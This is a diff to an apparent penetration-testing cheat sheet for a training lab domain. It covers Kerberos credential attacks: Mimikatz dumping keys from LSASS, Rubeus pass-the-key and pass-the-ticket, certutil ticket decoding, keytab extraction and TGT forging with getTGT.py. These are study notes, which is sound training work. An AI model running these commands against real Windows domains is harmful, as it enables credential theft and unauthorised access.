@@ -59,7 +59,7 @@ dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
 Rubeus.exe dump /nowrap # base64 format. (no admin priv needs)
 
 ---------------------------------------------------------------------------
-# Pass the Key or OverPass the Hash
+# Pass the Key or OverPass the Hash =  to get TGT  
 
 ## Mimikatz - Extract Kerberos Keys
 mimikatz.exe "privilege::debug" "sekurlsa::ekeys" # dump Kerberos keys from LSASS memory
@@ -79,6 +79,9 @@ mimikatz.exe  "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f7
 
 ## Rubeus - Pass the Key or OverPass the Hash
 Rubeus asktgt /user:plaintext /rc4:<rc4_hmac_nt> /domain:inlanefreight.htb /nowrap # forge a ticket on base64 format, the hash which can be `/rc4`, `/aes128`, `/aes256`, `/des`. we collect using Mimikatz `sekurlsa::ekeys`
+  # DECODE TGT(base64) + use it 
+  certutil -decode C:\temp\ticket.b64 C:\temp\ticket.kirbi # decode
+  Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi # pass the ticket 
 
 [!] # **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
 -----------------------------------------------------------------------------
@@ -177,9 +180,13 @@ smbclient //dc01/carlos -k -c ls # Connecting to SMB Share as Carlos
 -------------------------
 ### Keytab Extract
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab # NTLM , AES-256 , AES-128 
-- # NTLM -> pass the hash attack
-- # AES-256 + AES-128 -> forge our tickets
-- su - carlos@inlanefreight.htb # crack the NTLM hash to get the plaintext pass then login as carlos
+- # if NTLM -> pass the hash attack
+   su - carlos@inlanefreight.htb # crack the NTLM hash to get the plaintext pass then login as carlos
+
+- # if AES-256 OR AES-128 -> forge our tickets
+  Rubeus.exe asktgt /user:carlos /domain:INLANEFREIGHT.HTB /aes256:<hash> # widnows output tgt (based64)
+  getTGT.py -aesKey <AES-hash> INLANEFREIGHT.HTB/carlos # linux Output: carlos.ccache (TGT)
+ 
 -----------------------------------------------------------------------------
 ## Abusing cronjob Keytab
 repeat the process, crack the password, and log in as #=> svc_workstations user
